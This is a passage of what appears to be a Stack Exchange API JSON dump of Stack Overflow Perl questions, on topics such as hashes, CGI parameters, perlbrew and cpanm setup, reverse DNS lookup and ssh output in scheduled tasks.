into this before... </p>\n\n<p>Thanks !</p>\n"},{"tags":["perl","voip","ivr","vxml","pabx"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":12400197,"title":"VXML basics ( new to vxml )","body":"<p>So I currently have an IVR written in some dodgy old code which is confusing and goes way over the top for some things.</p>\n\n<p>I'm wanting to re-write one of my basic IVRs with VXML.</p>\n\n<p>So a little bit of research is that I can call perl scripts which I can use to run data past databases, that part isnt to bad.</p>\n\n<p>My question is how, or what is the syntax to use to \"hold\" or save the dtmf input for a menu, and then pass it to the perl script.</p>\n\n<p>Question two.</p>\n\n<p>Hosting of the VXML IVR. Are there any guides to setting up a test service? I have a PABX, and a few servers I can play around with.</p>\n"},{"tags":["perl","autodie"],"answer_count":4,"favorite_count":0,"up_vote_count":7,"down_vote_count":0,"view_count":251,"score":7,"question_id":3941632,"title":"Are there disadvantages to autodie?","body":"<p>Every now and again I see people on StackOverflow promote the use of <a href=\"http://search.cpan.org/dist/autodie\" rel=\"nofollow\">autodie</a>. But in the code here and elsewhere in the net I don't see autodie very often. Are there some disadvantages? Do I lose something when using autodie? (I have the idea of getting spoiled, when using autodie)</p>\n"},{"tags":["perl","executable"],"answer_count":3,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":797,"score":6,"question_id":3677114,"title":"Running a perl script on windows without extension","body":"<p>I am trying to find a way to register the files with extension <code>.pl</code> as executables.\nI spent some time on the web looking for a solution, but I couldn't find anything.</p>\n\n<p>What I can do:\nI made a script, let's call it <em>myscript.pl</em><br>\nI can run it like this :</p>\n\n<pre><code>perl myscript.pl [my_script_parameters]\n</code></pre>\n\n<p>Now since the file is associated with perl, I can also run it as:</p>\n\n<pre><code>myscript.pl [my_script_parameters] \n</code></pre>\n\n<p>Now, I know that there is somewhere a list of extensions that are considered as <strong>executables</strong> (.exe, .bat, etcâ¦). I would like to <strong>add</strong> <code>.pl</code> <strong>to this list</strong> so that I can run my script like this:</p>\n\n<pre><code>myscript [my_script_parameters]\n</code></pre>\n\n<p>Does anyone know how to do this?</p>\n\n<p>Thanks,</p>\n\n<p>Pascal</p>\n"},{"tags":["perl","unix","fedora"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12956739,"title":"Perl command not found","body":"<p>I am new to Unix. I am trying to Run a Perl script on Fedora 14 machine.</p>\n\n<p>I wrote the script and saved it in a file called PerlOne.pl and changed its permission to 755. This is what it has</p>\n\n<pre><code>#!/usr/bin/perl\nprint \"hello\";\n</code></pre>\n\n<p>I tried to run it so I got </p>\n\n<pre><code>/usr/bin/perl : bad interpreter no such file or directory.\n</code></pre>\n\n<p>So I checked if I already have perl by typing </p>\n\n<pre><code>perl -v\n</code></pre>\n\n<p>I got </p>\n\n<pre><code>perl: command not found \n</code></pre>\n\n<p>Is it possible that Fedora comes with no perl? or am I doing something wrong? if yes, then how can I install perl?</p>\n\n<p>Any help would be appreciated =)</p>\n"},{"tags":["windows","perl","memory-management"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":3855,"score":1,"question_id":423797,"title":"How can I find the exact amount of physical memory on Windows x86-32bit using Perl or any other language?","body":"<p>I need to know how much physical memory a windows machine has, using Perl.</p>\n\n<p>I've tried using <a href=\"http://search.cpan.org/dist/Win32-SystemInfo\" rel=\"nofollow\">Win32::SystemInfo</a>. However this module states the following caveat:</p>\n\n<blockquote>\n  <p>On Intel x86 computers with more than 2 GB and less than 4 GB of memory, the MemoryStatus function will always return 2 GB for TotalPhys. Similarly, if the total available memory is between 2 and 4 GB, AvailPhys will be rounded down to 2 GB.</p>\n</blockquote>\n\n<p>So on a machine which has 2-4 GB of physical memory, I get a false answer.</p>\n\n<p>Is there a way to get the correct amount of physical memory? Perhaps another module? Or directly using <a href=\"http://search.cpan.org/dist/Win32-API\" rel=\"nofollow\">Win32::API</a>?</p>\n\n<p>Edit: From the comments people gave here, it looks like the limitation is in the Win32 API , and not specific to <a href=\"http://search.cpan.org/dist/Win32-SystemInfo\" rel=\"nofollow\">Win32::SystemInfo</a>. However, the OS <strong>does</strong> know <strong><em>exactly</em></strong> how much physical ram is available, so there must be a way to extract that information. If not in Perl then maybe in another language?</p>\n"},{"tags":["perl","file","validation","parsing"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":49,"score":-3,"question_id":12956328,"title":"Perl to parse text file","body":"<p>here Im writing a perl program which to parse a file, it contians multiple line, in each line it has three fields: name, size in bytes and user.</p>\n\n<p>any sample code to validates the file? for example, if I want to check if a given file through argument that it is validate file? </p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":67,"score":2,"question_id":12955391,"title":"Split Sentence in para","body":"<p>I want split sentence in para using by perl.</p>\n\n<p>Now I using Lingua::EN::Sentence module, I can split sentence without internal </p>\n\n<pre><code>&gt; &lt;em&gt;\n</code></pre>\n\n<p>tag,  but I can't split this paragraph becuase internaly some tag</p>\n\n<p>Script:</p>\n\n<pre><code>use strict; use Lingua::EN::Sentence qw( get_sentences add_acronyms );\n\n$line = \"En meteen is er iets. Die voorstelling dat hapert\";\n\nmy $sentences = get_sentences($line); foreach my $sentence\n(@$sentences) {\n     print $sentence.\"\\n\"; }\n</code></pre>\n\n<p>output:</p>\n\n<pre><code>En meteen is er iets.\nDie voorstelling dat hapert\n\n\n\n\n  &gt; &lt;p&gt;luk heeft aan zichzelf genoeg, het heeft geen getuigen nodig. Then\n    &gt; &lt;em class=\"xix\"&gt;&lt;span class=\"emph-xix-brl\"&gt;anna Karenina&lt;/span&gt;.\n    &gt; &lt;/em&gt;Ik zou daar hooguit afkunnen. Hoe meer &lt;em&gt;getuigen hoe&lt;em&gt;\n    &gt; beter. Het alleen is.&lt;/p&gt;\n</code></pre>\n\n<p>this para how split?</p>\n"},{"tags":["perl","cron","crontab"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12954005,"title":"from cron running a subroutine from a perl module","body":"<p>I have a Perl Module that i created and i want to run one of the subroutine in it on a schedule. I know I can just make a small perl script that calls the subroutine and call it from the crontab but if there is a way to call the subroutine right from the crontab that would be cool! </p>\n\n<p>Is this possible? </p>\n"},{"tags":["perl","perl-data-structures"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":73,"score":-1,"question_id":12949584,"title":"Hash of Hashes in Perl","body":"<p>I have the question in Perl:Input 5 mobile set details (Invoice number, Model , Company, Memory , Price , Quantity ). Print all the details, total amount (quantity * price) , total quantity , number of mobiles from each company.</p>\n\n<p>My script is:</p>\n\n<pre><code>#!/usr/bin/perl\n\nmy %mobset = (\n    '1' =&gt; {\n        'Invoice No' =&gt;'3456',\n        'Model'      =&gt;'S9900',\n        'Company'    =&gt;'Sonyericcson',\n        'Memory'     =&gt;'1GB',\n        'Price'      =&gt;'8000',\n        'Qnty'       =&gt;'1',\n    },\n    '2' =&gt; {\n        'Invoice No' =&gt; '3457',\n        'Model'      =&gt; 'S3322',\n        'Company'    =&gt; 'Samsung',\n        'Memory'     =&gt; '2GB',\n        'Price'      =&gt; '9000',\n        'Qnty'       =&gt; '2',\n    },\n    '3' =&gt; {\n        'Invoice No' =&gt; '3458',\n        'Model'      =&gt; 'N4140',\n        'Company'    =&gt; 'Nokia',\n        'Memory'     =&gt; '512MB',\n        'Price'      =&gt; '5000',\n        'Qnty'       =&gt; '2',\n    },\n    '4' =&gt; {\n        'Invoice No' =&gt; '3459',\n        'Model'      =&gt; 'S4636',\n        'Company'    =&gt; 'Samsung',\n        'Memory'     =&gt; '256MB',\n        'Price'      =&gt; '6000',\n        'Qnty'       =&gt; '1',\n    }, \n    '5' =&gt; {\n        'Invoice No' =&gt; '3460',\n        'Model'      =&gt; 'S7854',\n        'Company'    =&gt; 'Samsung',\n        'Memory'     =&gt; '128MB',\n        'Price'      =&gt; '7000',\n        'Qnty'       =&gt; '1',\n    }\n);\n\nprint \"All the mobile set details are as follows:\\n\";\nforeach my $id(sort keys %mobset) {\n\n    print \"Mobile SlNo. = $id, Invoice No. = $mobset{$id}{'Invoice No'}, Model No. = $mobset{$id}{'Model'}, CompanyName = $mobset{$id}{'Company'}, Memory = $mobset{$id}{'Memory'}, Price = $mobset{$id}{'Price'}, Quantity = $mobset{$id}{'Qnty'}\\n\";\n\n    $totqty += $mobset{$id}{'Qnty'};\n    $totprice += $mobset{$id}{'Price'};\n}\n\nprint \"Total Quantity of mobile set is $totqty\\n\";\n$totamt = $totqty * $totprice;\nprint \"Total Amount of mobile set is Rs.$totamt\\n\";\n\nprint \"The company names of mobile are:\\n\";\nforeach my $id(sort keys %mobset) {\n\n    print \"$mobset{$id}{'Company'}\\n\"; \n}\n\n$name = SonyericcsonSamsungNokiaSamsungSamsung;\nmy @names = ($name =~ m/([A-Z][a-z]+)/g);\njoin(',',@names);\nmy %count;\n\nforeach (@names) {\n\n    if (exists $count{$_}) {\n\n        $count{$_}++;\n    } \n    else {\n\n        $count{$_} = 1;\n    }\n}\n\nprint \"The number of mobiles from each company are:\\n\";\nforeach (keys %count)  {\n\n    print \"$_ \\t = $count{$_}\\n\";\n}\n</code></pre>\n\n<p>My output is:</p>\n\n<pre><code>All the mobile set details are as follows:\nMobile SlNo. = 1, Invoice No. = 3456, Model No. = S9900, CompanyName = Sonyericcson, Memory = 1GB, Price = 8000, Quantity = 1\nMobile SlNo. = 2, Invoice No. = 3457, Model No. = S3322, CompanyName = Samsung, Memory = 2GB, Price = 9000, Quantity = 2\nMobile SlNo. = 3, Invoice No. = 3458, Model No. = N4140, CompanyName = Nokia, Memory = 512MB, Price = 5000, Quantity = 2\nMobile SlNo. = 4, Invoice No. = 3459, Model No. = S4636, CompanyName = Samsung, Memory = 256MB, Price = 6000, Quantity = 1\nMobile SlNo. = 5, Invoice No. = 3460, Model No. = S7854, CompanyName = Samsung, Memory = 128MB, Price = 7000, Quantity = 1\nTotal Quantity of mobile set is 7\nTotal Amount of mobile set is Rs.245000\nThe company names of mobile are:\nSonyericcson\nSamsung\nNokia\nSamsung\nSamsung\nThe number of mobiles from each company are:\nSonyericcson = 1\nNokia = 1\nSamsung = 3\n</code></pre>\n\n<p>But I am getting the o/p for number of mobiles because I did hardcode the mobile names which I am not supposed to. How can I solve the code?  </p>\n"},{"tags":["perl"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":100,"score":2,"question_id":12950828,"title":"An array and a variable as parameters in subroutine in perl","body":"<pre><code>sub abc()\n{\n\n}\n\nabc(@array,$a);\n</code></pre>\n\n<p>How do I access @array and $a in subroutine abc() ?\nI know about $<em>[0],$</em>[1] but I wasn't sure if I can use it for arrays.\nThanks in advance.</p>\n"},{"tags":["perl","numbers"],"answer_count":5,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":1496,"score":3,"question_id":1292710,"title":"How can I convert a number to text in Perl?","body":"<p>I need some code in my program which takes a number as input and converts it into corresponding text e.g. 745 to \"seven hundred forty five\".</p>\n\n<p>Now, I can write code for this, but is there any library or existing code I can use?</p>\n"}]}
{"total":22324,"page":8,"pagesize":100,"questions":[{"tags":["python","regex","performance","perl","text-processing"],"answer_count":6,"favorite_count":1,"up_vote_count":15,"down_vote_count":0,"view_count":468,"score":15,"question_id":12793562,"title":"text processing - python vs perl performance","body":"<p>Here is my perl and python script to do some simple text processing from about 21 log files each about 300KB to 1MB (max) x 5 times repeated (total of 125 files, due to the <em>log</em> repeated 5 times).</p>\n\n<p><strong>Python Code</strong> (code modified to use compiled re and using re.I)</p>\n\n<pre><code>#!/usr/bin/python\n\nimport re\nimport fileinput\n\nexists_re = re.compile(r'^(.*?) INFO.*Such a record already exists', re.I)\nlocation_re = re.compile(r'^AwbLocation (.*?) insert into', re.I)\n\nfor line in fileinput.input():\n    fn = fileinput.filename()\n    currline = line.rstrip()\n\n    mprev = exists_re.search(currline)\n\n    if(mprev):\n        xlogtime = mprev.group(1)\n\n    mcurr = location_re.search(currline)\n\n    if(mcurr):\n        print fn, xlogtime, mcurr.group(1)\n</code></pre>\n\n<p><strong>Perl Code</strong></p>\n\n<pre><code>#!/usr/bin/perl\n\nwhile (&lt;&gt;) {\n    chomp;\n\n    if (m/^(.*?) INFO.*Such a record already exists/i) {\n        $xlogtime = $1;\n    }\n\n    if (m/^AwbLocation (.*?) insert into/i) {\n        print \"$ARGV $xlogtime $1\\n\";\n    }\n\n}\n</code></pre>\n\n<p>And, on my PC both code generates exactly the same result file of 10,790 lines. And, here is the timing done on cygwin perl and python</p>\n\n<pre><code>User@UserHP /cygdrive/d/tmp/Clipboard\n# time /tmp/scripts/python/afs/process_file.py *log* *log* *log* *log* *log* &gt;\nsummarypy.log\n\nreal    0m8.185s\nuser    0m8.018s\nsys     0m0.092s\n\nUser@UserHP /cygdrive/d/tmp/Clipboard\n# time /tmp/scripts/python/afs/process_file.pl *log* *log* *log* *log* *log* &gt;\nsummarypl.log\n\nreal    0m1.481s\nuser    0m1.294s\nsys     0m0.124s\n</code></pre>\n\n<p>Originally, It took 10.2 secs using Python and only 1.9 secs using Perl for this simple text processing.</p>\n\n<p><strong>(UPDATE) but, after the compiled re version of python, it now takes 8.2 seconds in python and 1.5 seconds in perl. Still perl is much faster.</strong></p>\n\n<p>Is there anyway to improve the speed of Python at all OR it is obvious you expert guys that Perl will be the speedy one for simple text processing.</p>\n\n<p>By the way this was not the only test I did for simple text processing... And, each different way I make the source code, always always Perl wins by a large margin. And, not once did Python performed better for simple <code>m/regex/</code> match and print stuff.</p>\n\n<p>Thanks for your input.</p>\n\n<blockquote>\n  <p>Please do not suggest to use C, C++, Assembly, other flavours of\n  Python, etc.</p>\n  \n  <p>I am looking for a solution using Standard Python with its built-in\n  modules compared against Standard Perl (not even using the modules).\n  Boy, I wish to use Python for all my tasks due to its readability, but\n  to give up speed, I don't think so.</p>\n  \n  <p>So, please suggest how can the code be improved to have comparable\n  results with perl.</p>\n</blockquote>\n\n<p><strong>UPDATE: 18OCT2012</strong> </p>\n\n<p>As other users suggested, Perl has its place and Python has its.</p>\n\n<p>So, for this question, one can safely conclude that for simple regex match on each line for hundreds or thousands of text files and writing the results to a file (or printing to screen), <strong>Perl will always, always WIN in performance for this job, as simple as that.</strong></p>\n\n<p>Please note that when I say Perl wins in performance.. only standard Perl and Python is compared... not resorting to some obscure modules (obscure for a normal user like me) and also not calling C, C++, Assembly libraries from python or perl. We don't have time to learn all these extra steps and installation for a simple text matching job.</p>\n\n<p>So, Perl rocks for text processing and regex.</p>\n\n<p>Python has its place to rock in other places.</p>\n"},{"tags":["android","perl","testing","adb"],"answer_count":1,"favorite_count":4,"up_vote_count":4,"down_vote_count":0,"view_count":426,"score":4,"question_id":8237215,"title":"how to use perl script for testing android application using eclipse epic?","body":"<p>i am working on perl testing for android application ,how to use perl script for testing android application using eclipse epic </p>\n\n<p>please forward some solution </p>\n\n<p>Thank You Very Much </p>\n\n<p>Narasimha</p>\n"},{"tags":["perl","http","cgi"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":43,"score":3,"question_id":12949091,"title":"In Perl, how can I set HTTP POST parameters to locally fake a HTTP environment?","body":"<p>I have a third party Perl script designed to be executed by a browser and which processes data in a HTTP POST request.</p>\n\n<p>The script can be executed from the command line but when doing so it is not being executed in the expected environment and as such does not have access to required user data.</p>\n\n<p>I need to execute the script very frequently and want to avoid the overhead of spinning up an Apache process to handle what can instead be handled at the command line. The script executes from the command line much much much faster than via Apache (at least with no input data).</p>\n\n<p>I'd like to wrap up the script such that command line arguments are passed to the script as if they were present in a HTTP POST request.</p>\n\n<p>I'm not very familiar with Perl and would like to present a (rudimentary) example in PHP to represent what I intend to achieve.</p>\n\n<pre><code>&lt;?php\n\n$_POST['example1'] = $argv[1];\n$_POST['example2'] = $argv[2];\n\ninclude /var/www/thirdPartyScript.php\n\n?&gt;\n</code></pre>\n\n<p>The Perl script accesses data as follows:</p>\n\n<pre><code>#!/usr/bin/perl -T\n\nuse CGI 3.40 qw(-newstyle_urls -private_tempfiles redirect);\n# ...\nmy $q = CGI-&gt;new();\n# ...\nif ($q-&gt;param('example1') {\n\n} else {\n\n}\n</code></pre>\n\n<p><br />\nWhat would the wrapper script need to set such that the third party script has access to relevant data as if that data were provided in a HTTP POST request?</p>\n"},{"tags":["perl","mojolicious"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":12951576,"title":"Sending a response without calling render() from a Mojolicious::Lite application","body":"<p>I am writing a \"partial proxy\" in <code>Mojolicious::Lite</code>.  Certain requests (depending on the query path, and on the values of the parameters) generate a request to another server, while others are handled locally.</p>\n\n<p>There is a <a href=\"https://gist.github.com/42c32258713b34f3604e\" rel=\"nofollow\">nice proxy example</a>, but it totally overrides the request/response handling and thus is not suitable to my needs.</p>\n\n<p>Currently, I am marshalling the response via</p>\n\n<pre><code>$self-&gt;render(data =&gt; $res-&gt;body, code =&gt; $res-&gt;code);\n</code></pre>\n\n<p>Unfortunately, this does not take into account different content types.  Using <code>Mojolicious::Type</code> does not help,\nbecause I need a reverse mapping from the content type\nin <code>$res</code> to the <code>format</code> in <code>render()</code>;  besides,\nthe number of possible render formats is significantly smaller\nthan the number of possible content types.</p>\n\n<p>So ideally, instead of the <code>$self-&gt;render()</code> call above\nI need a way to say \"here, I got a response in <code>$res</code>;\nplease return it back to the client as is\".</p>\n\n<p>Any ideas?  Thanks!</p>\n"},{"tags":["perl","hash","perl-data-structures"],"answer_count":6,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":77,"score":0,"question_id":12936971,"title":"reading columns from Hash of Arrays","body":"<p>I'm new in perl and have a question concerning the use of hashes of arrays to retrieve specific columns. My code is the following:</p>\n\n<pre><code>my %hash = ( name1 =&gt; ['A', 'A', 'B', 'A', 'A', 'B'],\n             name2 =&gt; ['A', 'A', 'D', 'A', 'A', 'B'],\n             name3 =&gt; ['A', 'A', 'B', 'A', 'A', 'C'],\n             );\n\n#the values of %hash are returned as arrays not as string (as I want)\n\nforeach my $name (sort keys %hash ) {\n    print \"$name: \";\n    print \"$hash{$name}[2]\\n\";\n}\n\nfor (my $i=0; $i&lt;$length; $i++) {\n        my $diff = \"no\";\n        my $letter = '';\n        foreach $name (sort keys %hash) {\n            if (defined $hash{$name}[$i]) {\n                if ($hash{$name}[$i] =~ /[ABCD]/) {\n                    $letter = $hash{$name}[$i];\n                }\n                elsif ($hash{$name}[$i] ne $letter) { \n                    $diff = \"yes\";\n                }\n            }\n            if ( $diff eq \"yes\" ) {\n                foreach $name (sort keys %hash) {\n                    if (defined $hash{$name}[$i]) { $newhash{$name} .= $hash{$name}[$i]; }  \n                }\n            }\n        }\n    }\n    foreach $name (sort keys %newhash ) {\n        print \"$name: $newhash{$name} \\n\";\n    }\n</code></pre>\n\n<p>I want the output of this program to be something like a new hash with only the variable columns:</p>\n\n<pre><code>my %newhash = ( name1 =&gt; 'BB',\n            name2 =&gt; 'DB',\n            name3 =&gt; 'BC',\n              );\n</code></pre>\n\n<p>but is only given this message:\nUse of uninitialized value $letter in string ne at test_hash.pl line 31.</p>\n\n<p>Does anyone have ideas about this?\nCheers</p>\n\n<p>EDIT:</p>\n\n<p>Many thanks for your help in this question.</p>\n\n<p>I edited my post to confirm with the suggestions of frezik, Dan1111, Jean. You're right, now there are no warnings but I can not also get any output from the print statement and I don't have any clue about this...</p>\n\n<p>@TLP: ok I just generate a random set of columns without any order purpose. What I really want is about how the letters vary, which means that if for the same array index (stored in the hash) the letters are the same, discard those, but if the letters are different between keys, I want to store that index column in a new hash.</p>\n\n<p>Cheers.</p>\n"},{"tags":["perl","testing","integration-testing"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":67,"score":3,"question_id":12950442,"title":"Perl: integration tests","body":"<p>I'm asking for best practice.</p>\n\n<p>Usually I put all unit tests into t/, but what about integration tests?</p>\n\n<p>Where are the best place for integration tests?\nAnd how them will be named?</p>\n"},{"tags":["javascript","perl","button","internet","explorer"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":144,"score":2,"question_id":10643906,"title":"How to get Javascript to execute when clicking a button in IEAutomation?","body":"<p>I am using <code>Win32::IEAutomation</code> in perl to fill in a form and search, but when I use <code>getButton()-&gt;Click</code> I get the error <code>\"Can't call method \"Click\" on an undefined value\"</code>.  I am able to click an image (which executes javascript), but not the button.  I noticed in the documentaion for <code>Win32::IEAutomation</code> that it says the following under both \"<code>getImage</code>\" and \"<code>getLink</code>\", but NOT under \"<code>getButton</code>\":  </p>\n\n<p>\"As it uses click method of DOM, it supports clicking link with javascript in it.\"</p>\n\n<p>Can anyone tell me how to click the button and fire the javascript?</p>\n\n<p>Here is a skeleton of my code.  The final line is the one that gives me trouble.:</p>\n\n<pre><code>use Win32::IEAutomation;\nmy $ie = Win32::IEAutomation-&gt;new( visible =&gt; 1);\n$ie-&gt;gotoURL('https://www.mywebpage.com/index.html',1);\n\n$ie-&gt;getTextBox('id:', \"mytextbox\")-&gt;SetValue(\"relevant text\");\n$ie-&gt;getButton('id:', \"mybutton\")-&gt;Click;\n</code></pre>\n\n<p>and here is the relevant part of the html:</p>\n\n<pre><code>&lt;input type=\"text\" id=\"mytextbox\" /&gt;\n&lt;button id=\"mybutton\" title=\"Go\" class=\"ControlButton\" value=\"Go\" onclick=\"researchLookupObj.GoClick(CallServer);return false;\"&gt;Search&lt;/button&gt;\n</code></pre>\n\n<p>I am able to get the textbox to fill in (and am able to click on an image earlier in the code which is not shown here), but get the error with the button.  How can I tell it to execute the javascript named \"<code>researchLookupObj.GoClick()</code>\"?</p>\n"},{"tags":["perl","ip","lookup","nslookup","reverse-dns"],"answer_count":8,"favorite_count":1,"up_vote_count":8,"down_vote_count":0,"view_count":12184,"score":8,"question_id":85487,"title":"Reverse DNS lookup in perl","body":"<p>How do I perform a reverse DNS lookup, that is how do I resolve an IP address to its DNS hostname in Perl?</p>\n"},{"tags":["windows","perl","task","scheduler"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":59,"score":3,"question_id":12943962,"title":"Perl script invoking ssh2 command fail to get output back in windows task scheduler","body":"<p>I can run the Perl script from command line without any issue, but when I try to automate this task by using Windows Task Manager (64bit Windows 2008 Server), the output from SSH/SSH2 cannot be written to the outfile. It is a perl script, and it does something like this:</p>\n\n<pre><code>my $DB_FILE1=$PATH . \"\\\\FSBusinessUtil_\" . $hostfqdn . $DATE;\nopen( OUTFILE,  \"&gt;$DB_FILE1\" )      or die \"Could not open data file \";\nprint OUTFILE \"FilesystemInfo\\n\";   \n\nmy $output1=`$SSH_PATH\\\\ssh $user\\@$hostname NAS_DB=/nas /nas/bin/./nas_fs -list`;\n\nif($? != $RC_OK){\n    open( OUT1FILE, \"&gt;$PATH\\\\errFSBusinessUtil_$hostfqdn$DATE\");\n    print OUT1FILE localtime(time) . \" Remote ssh failed to create $DB_FILE1. Error: $output1\\n\"; \n    close OUT1FILE;\n}\nelse {\n    $output1=~ s/%%%/\\n/g;\n    print OUTFILE $output1;\n}  \nclose OUTFILE; \n</code></pre>\n\n<p>The Perl script itself got invoked by the Windows Task Scheduler, but in the output file, all I saw is the \"FilesystemInfo\" line the script prints out before invoking the ssh command. Besides that, the command did fail, because I saw the error file generated. But still, $output1 is empty so nothing but \"Remote ssh failed to create... Error:\". </p>\n"},{"tags":["perl","hpux","solaris-10"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12948631,"title":"max file handles that can be opened in perl","body":"<p>I am working on a perl script that opens a huge file and which has the  records in the below format.  Script might run in Solaris 10  or HP UX 11.0</p>\n\n<pre><code>Filename1 , col1, col2\nFilename1 , col1, col2\nFilename2 , col1, col2\nFilename3 , col1, col2\n</code></pre>\n\n<p>When i read the first field  file name of the  input file  i need to create a new file if it doesnt exists and print the rest of the fields to the file.  There might be 13000  U File name  in the input file.  How many file handles i can open max in Solaris 10 or hpux 11.  Will i be able to open 13000 file handles?  Planning to use a hash to store the file handles for writing it to the files and closing it.   Also how can i get easily the unique file name from the first field across the whole file. Is there a easy way to do it rather than reading each line of the file?  </p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":12948136,"title":"Digit Occurence of a Number in Perl","body":"<p>The question is:\nPerl script that counts the number of times each digit appears in the given input. Print the total for each digit and the sum of all the totals.</p>\n\n<p>The script is:</p>\n\n<pre><code>#!/usr/bin/perl\n\nmy $str = '654768687698579870333';\n\nif ($str =~ /(.*)[^a]+/) {\n\n    my $substr = $1;\n    my %counts;\n\n    $counts{$_}++ for $substr =~ /./g;\n\n    print \"The count each digit appears is: \\n\";\n    print \"'$_' - $counts{$_}\\n\" foreach sort keys %counts;\n    my $sum = 0;\n    $sum += $counts{$_} foreach keys %counts;\n    print \"The sum of all the totals is $sum\\n\";    \n}\n</code></pre>\n\n<p>The Output I am getting is:</p>\n\n<pre><code>The count each digit appears is:\n'0' - 1\n'3' - 2\n'4' - 1\n'5' - 2\n'6' - 4\n'7' - 4\n'8' - 4\n'9' - 2\nThe sum of all the totals is 20\n</code></pre>\n\n<p>But the output I am supposed to get is: </p>\n\n<pre><code>The count each digit appears is:\n'0' - 1\n'3' - 3\n'4' - 1\n'5' - 2\n'6' - 4\n'7' - 4\n'8' - 4\n'9' - 2\nThe sum of all the totals is 21\n</code></pre>\n\n<p>Where am I going wrong? Please help. Thanks in advance</p>\n"},{"tags":["perl","installation","offline","perlbrew"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":182,"score":1,"question_id":10242451,"title":"How to install Perl offline","body":"<p>I have a Linux server that has no access to the internet (access is prevented by a firewall). I would like to install a new Perl. What are my options and what is the best way to do this? The system Perl (included in OS installation) must remain unchanged. </p>\n\n<p>I have been using perlbrew and I think it is the best way to do an online installation. But all the steps involved in perlbrew seem to require internet access: you download it from the net, it downloads new Perl versions from the net etc. and I haven't found a glue how to make it work offline.</p>\n\n<p>If perlbrew is out of question I could build Perl from source into a custom location on the server. I assume that this could end up being complicated, time-consuming and error-prone. And every time I update Perl I have make a new build manually.  </p>\n\n<p>There can also be other ways to install that I'm not currently aware of. And of course I could stick with the system Perl but it is an outdated version and I'm already using the new syntax features. Or I could start negotiations to change the firewall policy to allow internet access for perlbrew.</p>\n"},{"tags":["perl","cpan","perlbrew"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12878409,"title":"Private perlbrew and CPAN not working. Still. Again","body":"<p>I thought I had it working.</p>\n\n<p>I have an entirely private version of Perl 5.16 (by private I mean local to my home directory), and a private place for CPAN modules.  I followed the instructions at <a href=\"http://blog.fox.geek.nz/2010/09/installing-multiple-perls-with.html\" rel=\"nofollow\">http://blog.fox.geek.nz/2010/09/installing-multiple-perls-with.html</a> (adjusting for its slight out-of-datedness), which claims to entirely sidestep the need for local::lib.  I used the cpanm that the above-mentioned instrux installed, to install Cache::Memcached::Fast.pm, and successfully ran a Perl program that used this module.</p>\n\n<p>Today it's not working.</p>\n\n<pre><code>Can't locate Cache/Memcached/Fast.pm in @INC (@INC contains:     \n/Users/chap/perl5/perlbrew/perls/perl-5.16.1/lib/site_perl/5.16.1/darwin-2level\n/Users/chap/perl5/perlbrew/perls/perl-5.16.1/lib/site_perl/5.16.\n/Users/chap/perl5/perlbrew/perls/perl-5.16.1/lib/5.16.1/darwin-2level\n/Users/chap/perl5/perlbrew/perls/perl-5.16.1/lib/5.16.1 .) at ./memget line 11.\n</code></pre>\n\n<p>Some troubleshooting:</p>\n\n<pre><code>/Users/chap$ perlbrew use\nCurrently using perl-5.16.1\n</code></pre>\n\n<p>...sweet.</p>\n\n<pre><code>/Users/chap$ which perl\n/Users/chap/perl5/perlbrew/perls/perl-5.16.1/bin/perl\n</code></pre>\n\n<p>...awesome.</p>\n\n<pre><code>/Users/chap$ perlbrew switch perl-5.16.1\n/Users/chap$ cpanm --interactive -v App::cpanoutdated\ncpanm (App::cpanminus) 1.5014 on perl 5.012004 built for darwin-thread-multi-2level\nWork directory is /Users/chap/.cpanm/work/1350175791.76873\nYou have make /usr/bin/make\nYou have LWP 6.03\nYou have /usr/bin/tar: bsdtar 2.8.3 - libarchive 2.8.3\nYou have /usr/bin/unzip\nSearching App::cpanoutdated on cpanmetadb ...\n!\n! Can't write to /Library/Perl/5.12 and /usr/local/bin: Installing modules to /Users/chap/perl5\n! To turn off this warning, you have to do one of the following:\n!   - run me as a root or with --sudo option (to install to /Library/Perl/5.12 and /usr/local/bin)\n!   - Configure local::lib your existing local::lib in this shell to set PERL_MM_OPT etc.\n!   - Install local::lib by running the following commands\n!\n!         cpanm --local-lib=~/perl5 local::lib &amp;&amp; eval $(perl -I ~/perl5/lib/perl5/ -Mlocal::lib)\n!\nChecking if you have ExtUtils::MakeMaker 6.31 ... Yes (6.62)\nChecking if you have ExtUtils::Install 1.46 ... Yes (1.55)\nApp::cpanoutdated is up to date. (0.23)\n</code></pre>\n\n<p>Uh oh.  Why the system Perl???</p>\n"},{"tags":["perl","parsing","junit","cppunit"],"answer_count":1,"favorite_count":2,"up_vote_count":24,"down_vote_count":1,"view_count":360,"score":23,"question_id":9248085,"title":"CppUnit output to TAP format converter","body":"<p>I seek a perl module to convert CppUnit output to TAP format. I want to use the <em>prove</em> command afterwards to run and check the 